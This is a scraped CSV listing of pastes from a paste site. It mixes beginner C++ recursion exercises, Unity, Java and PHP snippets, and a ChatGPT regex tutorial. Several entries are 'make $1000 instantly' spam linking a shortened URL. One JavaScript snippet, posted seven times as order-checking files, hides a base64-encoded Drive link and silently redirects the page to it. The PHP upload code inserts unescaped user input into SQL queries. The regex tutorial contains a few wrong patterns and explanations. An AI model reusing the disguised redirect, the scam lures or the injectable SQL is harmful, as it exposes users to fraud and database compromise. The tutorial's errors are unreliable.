id,title,username,language,date,content
mdvPTdFx,Make $1000 15-MINUTES (BEGINNER) FM,OffbrandShrek,JavaScript,Sunday 13th of April 2025 07:06:45 AM CDT," 
Pdf https://tinyurl.com/privguidee


ueCvj5R35y
"
2Qnn0YQu,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 06:58:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88449/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aNGQ7mcV,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:55:51 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

int rec(int number) {
    if(number == 0) {
        return 0;
    }
    int cifra = number % 10;
    return rec(number / 10) + cifra;
}
int main() {
    cout << rec(1234) << endl;
    
    return 0;
}


// rec(1234) = rec(123) + 4 = 6 + 4 = 10
// rec(123) = rec(12) + 3 = 3 + 3 = 6
// rec(12) = rec(1) + 2 = 1 + 2 = 3
// rec(1) = rec(0) + 1 = 0 + 1 = 1
// rec(0) = 0
"
cpt89kFj,EARN $900 INSTANTLY 2025⭐ G8,OffbrandShrek,JavaScript,Sunday 13th of April 2025 06:53:20 AM CDT," 
Pdf https://tinyurl.com/privguidee


ZFO7soGRoz
"
vaUYx897,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 06:43:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65772/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eVUbjvPm,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:42:31 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x > 100) {
        return;
    }
    
    bool prost = true;
    for(int i = 2; i < x; i++) {
        if(x % i == 0) {
            prost = false;
            break;
        }
    }
    if(prost and x != 1) {
        cout << x << "" "";
    }
    print(x + 1);
}
int main() {
    print(1);
    
    return 0;
}
// print(1) --> print(2) | cout << 1;
// print(2) --> print(3) | cout << 2;
// print(3) --> print(4) | cout << 3;
// print(4) --> print(5) | cout << 4;
// print(5) --> print(6) | cout << 5;
// print(6)
"
KFAkb6CM,Make $1000 15-MINUTES  (BEGINNER) HV,OffbrandShrek,JavaScript,Sunday 13th of April 2025 06:39:53 AM CDT," 
Pdf https://tinyurl.com/privguidee


DdZGsUFLeJ
"
Y77RbQh5,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:28:53 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x > 5) {
        return;
    }
    
    print(x + 1);
    cout << x << endl;
}
int main() {
    print(1);
    
    return 0;
}
// print(1) --> print(2) | cout << 1;
// print(2) --> print(3) | cout << 2;
// print(3) --> print(4) | cout << 3;
// print(4) --> print(5) | cout << 4;
// print(5) --> print(6) | cout << 5;
// print(6)
"
kqskcYBN,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 06:28:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69929/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
y8iC4FbF,EARN $900 INSTANTLY 2025 2U,OffbrandShrek,JavaScript,Sunday 13th of April 2025 06:26:27 AM CDT," 
Pdf https://tinyurl.com/privguidee


8C06LvPfAJ
"
eubttTeM,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:22:00 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x < 1) {
        return;
    }
    cout << x << "" "";
    print(x - 1);
}
int main() {
    print(5);
    
    return 0;
}
// print(5)
"
gvDHmbwZ,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:18:33 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x > 100) {
        return;
    }
    
    cout << x << endl;
    print(x + 1);
}
int main() {
    print(1);
    
    return 0;
}
// print(1)
// print(2)
// print(3)
// print(4)
// print(5)
// print(6)
"
svZiWM4d,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:16:41 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x > 5) {
        return;
    }
    
    cout << x << endl;
    print(x + 1);
}
int main() {
    print(1);
    
    return 0;
}
// print(1)
// print(2)
// print(3)
// print(4)
// print(5)
// print(6)
"
ViWWfjVv,Make $1000 15-MINUTES (BEGINNER) FM,OffbrandShrek,JavaScript,Sunday 13th of April 2025 06:13:01 AM CDT," 
Pdf https://tinyurl.com/privguidee


WSlfQGBr6D
"
QbgijkJY,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 06:12:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10919/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CmADwkL4,dataNone,TestGuy1,JSON,Sunday 13th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '1a12b2ed20cae7a3264d0739898f03e8eabb18ea7d4a4fa1f532e1a4842db5f4ac1b4a0dbe267067e8bcb588af19be761c19a6fa13099a94e8c0269f9b9931580215a29bf0fa7bc6d9a31a8513782d8067c490bb81086228e600d23f22b06868891200e7c09959b5f263c9e192ab10e4d4be5712350b13635c382c07856b91bd',
  otherdata: [
    '149efc3674c9d38776dd80d0235ba104',
    '312dc2f505d513d4e0a326b0fc2ce37c',
    '20133546866cfe6b1bde28e8de861084',
    '0826de8d0954c54833cbe5bf02a8fb9a',
    '8fbd5633ab728be7bc70bebb1aa03916',
    '0c331001678747d73a065c6502fdbf90',
    '66ea9de7d2674f470a3f8a71a2bda38a',
    'b48bf95b4290bf15582f9057b2d0b596'
  ]
}"
PU7B7uUT,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 05:57:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52365/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hMWRyeD5,Untitled,Feynom,C#,Sunday 13th of April 2025 05:54:59 AM CDT,"using Cysharp.Threading.Tasks;
using UnityEngine;
using UnityEngine.AddressableAssets;

public class AddressablesTest : MonoBehaviour
{
    [Header(""Preferences"")]
    [SerializeField] private AssetReferenceGameObject _assetReferenceGameObject;

    private GameObject _instance;

    private async void Instantiate()
    {
        if (_instance != null)
            return;

        _instance = await Addressables.InstantiateAsync(_assetReferenceGameObject);
    }

    private void DestroyInstance()
    {
        if (_instance == null)
            return;

        Addressables.ReleaseInstance(_instance);
        _instance = null;
    }

    private void OnGUI()
    {
        if (GUILayout.Button(""Instantiate""))
            Instantiate();

        if (GUILayout.Button(""Destroy Instance""))
            DestroyInstance();

        if (GUILayout.Button(""Unload Unused Assets""))
            Resources.UnloadUnusedAssets();
    }
}"
VaEC8WeB,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 05:41:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34433/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z1LDQmjY,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 05:26:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29269/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
duN9aAqf,[NP] Line Processor,dzocesrce,Java,Sunday 13th of April 2025 05:18:20 AM CDT,"import java.io.*;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

class LineProcessor {

    List<String> lines;

    public LineProcessor() {
        lines= new ArrayList<>();
    }

    public int countOcc(String line, char c){
        int total=0;
        for(char l : line.toCharArray()){
            if(l==c)
                total++;
        }
        return total;
    }


    public void readLines(InputStream in, PrintStream out, char a) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        lines = bufferedReader.lines().map(i-> i.toLowerCase()).collect(Collectors.toList());

        Comparator<String> comparator = Comparator.comparing(str->countOcc(str,a));

        PrintWriter printWriter = new PrintWriter(out);

        String max = lines.stream().max(comparator.thenComparing(Comparator.naturalOrder())).get();
        printWriter.println(max);
        printWriter.flush();

    }
}

public class LineProcessorTest {

    public static void main(String[] args) {
        LineProcessor lineProcessor = new LineProcessor();


        lineProcessor.readLines(System.in, System.out, 'a');
    }
}
"
n6hzkrd7,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 05:11:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21145/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kBaFhrn4,tracks,vitnet,PHP,Sunday 13th of April 2025 05:03:28 AM CDT,"
    // Обработка xfields
    $xfieldsid = $added_time;
    $xfieldsaction = ""init"";
    include ENGINE_DIR . '/inc/xfields.php';

    // Загрузка MP3 файла
    $mp3Data = handleFileUpload(
        'f_music',
        'files/mp3/tracks/',
        ['mp3'],
        $config['max_file_size'],
        $title,
        $added_time
    );
    
    if (!$mp3Data['success']) {
        msg(""error"", $lang['addnews_error'], $mp3Data['message'], ""javascript:history.go(-1)"");
    }

    // Загрузка обложки
    $coverData = handleFileUpload(
        'cv_music',
        'files/cover/tracks/',
        ['jpg'],
        $config['max_file_size'],
        $title,
        $added_time
    );
    
    if (!$coverData['success']) {
        msg(""error"", $lang['addnews_error'], $coverData['message'], ""javascript:history.go(-1)"");
    }

    // Получение информации о MP3
    if (!empty($mp3Data['file_path'])) {
        include ENGINE_DIR . '/classes/muz/id3v2.class.php';
        $audio = new id3v2();
        $audio->GetInfo($mp3Data['file_path']);
        $id3v1 = $audio->id3v1Info;
        $mpegInfo = $audio->mpegInfo;
        
        $muz_beats = $parse->remove($mpegInfo['Bitrate']);
        $muz_ggc = $parse->remove($mpegInfo['SamplingRate']);
        $muz_lenght = $parse->remove($mpegInfo['PlayTime']);
    }

    // Сохранение данных в базу
    saveToDatabase(
        $member_id,
        $title,
        $short_story,
        $full_story,
        $filecontents,
        $metatags,
        $alt_name,
        $allow_comm,
        $approve,
        $allow_main,
        $news_fixed,
        $allow_br,
        $catalog_url,
        $allow_rating,
        $add_vote,
        $disable_index,
        $group_regel,
        $vote_title,
        $frage,
        $vote_body,
        $allow_m_vote,
        $expires,
        $expires_action,
        $mp3Data,
        $coverData,
        $muz_beats,
        $muz_ggc,
        $muz_lenght,
        $muz_file_cat
    );

    // Логирование и очистка кеша
    $db->query(""INSERT INTO "" . USERPREFIX . ""_admin_logs (name, date, ip, action, extras) VALUES ('"" . $db->safesql($member_id['name']) . ""', '{$_TIME}', '{$_IP}', '1', '{$title}')"");
    clear_cache(['news_', 'related_', 'tagscloud_', 'archives_', 'calendar_', 'topnews_', 'rss']);

    msg(""info"", $lang['addnews_ok'], $lang['addnews_ok_1'] . "" \"""" . stripslashes(stripslashes($title)) . ""\"" "" . $lang['addnews_ok_2']);

/**
 * Обрабатывает загрузку файла на сервер
 */
function handleFileUpload($fieldName, $targetDir, $allowedTypes, $maxSizeMb, $title, $added_time) {
    global $parse;
    
    $result = [
        'success' => false,
        'message' => '',
        'file_name' => '',
        'file_path' => '',
        'file_size' => 0
    ];

    if (empty($title)) {
        $result['message'] = 'Заполните поле ""Название""';
        return $result;
    }

    if (!isset($_FILES[$fieldName]) || $_FILES[$fieldName]['error'] !== UPLOAD_ERR_OK) {
        $result['message'] = 'Файл не был загружен';
        return $result;
    }

    // Проверка и создание директории
    if (!is_dir(ROOT_DIR . ""/"" . $targetDir)) {
        @mkdir(ROOT_DIR . ""/"" . $targetDir, 0777, true);
        @chmod(ROOT_DIR . ""/"" . $targetDir, 0777);
    }

    $fileName = $_FILES[$fieldName]['name'];
    $fileParts = explode('.', $fileName);
    $fileExt = strtolower(end($fileParts));

    if (!in_array($fileExt, $allowedTypes)) {
        $result['message'] = 'Недопустимый формат файла. Разрешены: ' . implode(', ', $allowedTypes);
        return $result;
    }

    // Проверка размера файла
    $fileSizeKb = filesize($_FILES[$fieldName]['tmp_name']) / 1024;
    $maxSizeKb = $maxSizeMb * 1024;
    
    if ($fileSizeKb > $maxSizeKb) {
        $result['message'] = ""Размер файла превышает {$maxSizeMb} Mb"";
        return $result;
    }

    // Генерация имени файла
    $translitName = totranslit($title);
    $newFileName = $added_time . ""-"" . $translitName . '.' . $fileExt;
    $fullFilePath = ROOT_DIR . '/' . $targetDir . $newFileName;

    if (!@move_uploaded_file($_FILES[$fieldName]['tmp_name'], $fullFilePath)) {
        $result['message'] = 'Ошибка при сохранении файла';
        return $result;
    }

    $result['success'] = true;
    $result['file_name'] = $newFileName;
    $result['file_path'] = $fullFilePath;
    $result['file_size'] = filesize($fullFilePath);
    
    return $result;
}

/**
 * Сохраняет все данные в базу данных
 */
function saveToDatabase(
    $member_id,
    $title,
    $short_story,
    $full_story,
    $filecontents,
    $metatags,
    $alt_name,
    $allow_comm,
    $approve,
    $allow_main,
    $news_fixed,
    $allow_br,
    $catalog_url,
    $allow_rating,
    $add_vote,
    $disable_index,
    $group_regel,
    $vote_title,
    $frage,
    $vote_body,
    $allow_m_vote,
    $expires,
    $expires_action,
    $mp3Data,
    $coverData,
    $muz_beats,
    $muz_ggc,
    $muz_lenght,
    $muz_file_cat
) {
    global $db, $thistime, $_TIME, $_IP, $_POST;

    // Основная запись новости
    $db->query(""INSERT INTO "" . PREFIX . ""_post (
        date, autor, short_story, full_story, xfields, title, descr, keywords, 
        alt_name, allow_comm, approve, allow_main, fixed, allow_br, symbol, tags, 
        metatitle, muz_ssilka, cover_ssilka, muz_razmer, muz_beats, muz_ggc, 
        muz_lenght, muz_dcount
    ) VALUES (
        '$thistime', '{$member_id['name']}', '$short_story', '$full_story', 
        '$filecontents', '$title', '{$metatags['description']}', '{$metatags['keywords']}', 
        '$alt_name', '$allow_comm', '$approve', '$allow_main', '$news_fixed', 
        '$allow_br', '$catalog_url', '{$_POST['tags']}', '{$metatags['title']}', 
        'tracks/{$mp3Data['file_name']}', 'tracks/{$coverData['file_name']}', 
        '{$mp3Data['file_size']}', '$muz_beats', '$muz_ggc', '$muz_lenght', '0'
    )"");

    $row = $db->insert_id();

    // Дополнительные данные новости
    $db->query(""INSERT INTO "" . PREFIX . ""_post_extras (
        news_id, allow_rate, votes, disable_index, access, user_id
    ) VALUES(
        '{$row}', '{$allow_rating}', '{$add_vote}', '{$disable_index}', 
        '{$group_regel}', '{$member_id['user_id']}'
    )"");

    // Голосование
    if ($add_vote) {
        $db->query(""INSERT INTO "" . PREFIX . ""_poll (
            news_id, title, frage, body, votes, multiple, answer
        ) VALUES(
            '{$row}', '$vote_title', '$frage', '$vote_body', 0, '$allow_m_vote', ''
        )"");
    }

    // Истекающие новости
    if ($expires) {
        $expires_action = intval($_POST['expires_action']);
        $db->query(""INSERT INTO "" . PREFIX . ""_post_log (
            news_id, expires, action
        ) VALUES(
            '{$row}', '$expires', '$expires_action'
        )"");
    }

    // Теги
    if (!empty($_POST['tags']) && $approve) {
        $tags = [];
        $_POST['tags'] = explode("","", $_POST['tags']);

        foreach ($_POST['tags'] as $value) {
            $tags[] = ""('"" . $row . ""', '"" . trim($value) . ""')"";
        }

        $tags = implode("", "", $tags);
        $db->query(""INSERT INTO "" . PREFIX . ""_tags (news_id, tag) VALUES "" . $tags);
    }

    // Файлы
    if (!empty($mp3Data['file_name'])) {
        $db->query(""INSERT INTO "" . PREFIX . ""_files (
            news_id, name, onserver, author, date, muz_razmer
        ) VALUES (
            '{$row}', '"" . $title . "" [BeatBass.Ru].mp3', 
            '{$muz_file_cat['alt_name']}/{$mp3Data['file_name']}', 
            '"" . $member_id['name'] . ""', '"" . time() . ""', 
            '{$mp3Data['file_size']}'
        )"");
    }

    // Обложки
    if (!empty($coverData['file_name'])) {
        $db->query(""INSERT INTO "" . PREFIX . ""_cover (
            news_id, onserver
        ) VALUES (
            '{$row}', '{$muz_file_cat['alt_name']}/{$coverData['file_name']}'
        )"");
    }

    return $row;
}"
wvTFvATx,Regex,mayankjoin3,Python,Sunday 13th of April 2025 05:00:55 AM CDT,"Set 1: Basics – Literal Matches and Simple Character Classes
Focus: Matching exact strings and basic patterns
Match the word ""India""

Regex: India

Explanation: Matches the exact word ""India"" anywhere in the text.

Match either ""Delhi"" or ""Mumbai""

Regex: Delhi|Mumbai

Explanation: Matches either of the two city names.

Match any single digit (e.g., part of a pincode)

Regex: [0-9]

Explanation: Matches any single digit from 0 to 9.

Match all vowels (useful for analyzing names)

Regex: [aeiouAEIOU]

Explanation: Matches any vowel (both lowercase and uppercase).

Match the word ""Namaste"" exactly at the start of a sentence

Regex: ^Namaste

Explanation: ^ anchors the pattern to the beginning of a line.

Set 2: Quantifiers and Common Formats
Focus: Using +, *, {n}, ?
Match a sequence of 5 digits (Indian pincode)

Regex: \b\d{6}\b

Explanation: Matches exactly 6-digit numbers; \b ensures word boundary.

Match a word like “Ram”, “Rama”, “Ramaa”, etc.

Regex: Rama*

Explanation: Matches ""Ram"", ""Rama"", ""Ramaa"", etc. (a* = 0 or more a's)

Match names starting with 'A' followed by any 2 letters

Regex: A[a-zA-Z]{2}

Explanation: Matches strings like “Ami”, “Aru”, etc.

Match a string that ends with “ji” (e.g., Gandhi ji)

Regex: ji$

Explanation: $ anchors to the end of the string.

Match any word containing at least one vowel

Regex: \b\w*[aeiouAEIOU]\w*\b

Explanation: \w* matches any word with at least one vowel.

Would you like me to continue with the next 5 examples? The next set will start exploring groups, more complex alternation, and Indian-specific formats like phone numbers and vehicle registration numbers.

You said:
Next 5
ChatGPT said:
Great! Here's the next batch.

Set 3: Grouping, Alternation, and Indian-Specific Formats
Focus: Using parentheses (), grouping with |, and applying to real-life Indian formats
Match either “Kolkata” or “Chennai” or “Bengaluru”

Regex: (Kolkata|Chennai|Bengaluru)

Explanation: Grouping with | lets you match any one of these cities.

Match Indian mobile numbers starting with 7, 8, or 9

Regex: [789]\d{9}

Explanation: Matches a 10-digit mobile number starting with 7, 8, or 9.

Match vehicle registration numbers like KA01AB1234

Regex: [A-Z]{2}\d{2}[A-Z]{2}\d{4}

Explanation: Matches Indian vehicle plates (e.g., KA01AB1234, DL09CD6789).

Match PAN card format (e.g., ABCDE1234F)

Regex: [A-Z]{5}[0-9]{4}[A-Z]

Explanation: Matches PAN structure – 5 uppercase letters, 4 digits, 1 uppercase letter.

Match Aadhaar numbers (12-digit format, optional spaces)

Regex: \d{4} ?\d{4} ?\d{4}

Explanation: Matches Aadhaar numbers with or without spaces (e.g., 123456789012 or 1234 5678 9012).

Would you like the next 5 examples to focus on email validation, name patterns, and Indian website formats? Or shall we go deeper into advanced regex concepts like lookaheads, backreferences, etc.?

You said:
Next 5
ChatGPT said:
Perfect! Here's the next set.

Set 4: Indian Names, Emails, and Web Patterns
Focus: Character classes, optional elements, and realistic Indian data
Match typical Indian names starting with capital (e.g., “Amit”, “Suresh”, “Priya”)

Regex: [A-Z][a-z]{2,}

Explanation: Matches a capital letter followed by at least two lowercase letters – good for basic name detection.

Match common Indian email addresses (e.g., raj.kumar@gmail.com)

Regex: [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.(com|in)

Explanation: Matches Gmail, Yahoo, etc. ending in .com or .in – commonly used domains in India.

Match Indian website URLs like www.irctc.co.in

Regex: www\.[a-zA-Z0-9\-]+\.(com|in|co\.in)

Explanation: Matches websites ending in common Indian domains like .in and .co.in.

Match names with optional title (e.g., Mr. Sharma, Mrs. Rani)

Regex: (Mr|Mrs|Ms)\.?\s[A-Z][a-z]+

Explanation: Matches optional period after title, then a capitalized surname.

Match hashtags used in Indian context (e.g., #India, #IPL2025)

Regex: #\w+

Explanation: Matches hashtags (words beginning with # and followed by letters/digits).

Let me know if you'd like to continue to the next 5. We can start getting into lookaheads, backreferences, or custom validations like matching date formats (e.g., 13/04/2025), or GSTIN numbers.

You said:
Next
ChatGPT said:
Awesome, let’s keep it rolling!

Set 5: Dates, Times, and Advanced Indian Format Validation
Focus: Date/time patterns, character escapes, and real-world validation
Match Indian date format DD/MM/YYYY (e.g., 13/04/2025)

Regex: \b\d{2}/\d{2}/\d{4}\b

Explanation: Matches dates in day/month/year format with slashes.

Match 24-hour time format (e.g., 14:35, 09:00)

Regex: \b([01]\d|2[0-3]):[0-5]\d\b

Explanation: Validates 00:00 to 23:59 format.

Match Indian currency values (e.g., ?500, ?12,34,567.89)

Regex: ?[0-9,]+(\.\d{2})?

Explanation: Matches ? followed by Indian-style numerals with optional paise.

Match Indian GSTIN (Goods and Services Tax Identification Number)

Regex: \d{2}[A-Z]{5}\d{4}[A-Z]{1}[A-Z\d]{1}[Z]{1}[A-Z\d]{1}

Explanation: Matches the 15-character alphanumeric GSTIN format.

Match Indian STD codes (e.g., 011, 022, 080)

Regex: 0\d{2,3}

Explanation: Matches STD codes starting with 0 and 2–3 digits.

We're halfway through! ??
Ready for the next 5? Shall we continue with lookaheads, validations, or regional language elements (like Hindi text in Unicode)?

You said:
Next
ChatGPT said:
Love the momentum! Here's the next batch.

Set 6: Lookaheads, Word Boundaries, and Unicode (Indian Language Basics)
Focus: Lookaheads, word boundaries, and basic Hindi character matching
Match a word that starts with ""Bharat"" but doesn’t end with ""Mata""

Regex: \bBharat(?!.*Mata)\b

Explanation: Negative lookahead ensures ""Mata"" doesn’t appear after ""Bharat"".

Match a sentence that contains ""India"" only if it's followed by ""is great""

Regex: India(?= is great)

Explanation: Positive lookahead ensures ""India"" is only matched when followed by ""is great"".

Match exact word ""chai"" as a standalone word

Regex: \bchai\b

Explanation: Word boundaries (\b) ensure it doesn’t match ""chaibreak"" or ""masalachai"".

Match Hindi characters (Devanagari script, e.g., ??????)

Regex: [\u0900-\u097F]+

Explanation: Matches one or more characters in the Devanagari Unicode range.

Match sentences ending with ""hai"" (common in spoken Hindi)

Regex: \b\w+\s+hai\.?$

Explanation: Matches lines ending with ""hai"" optionally followed by a period."
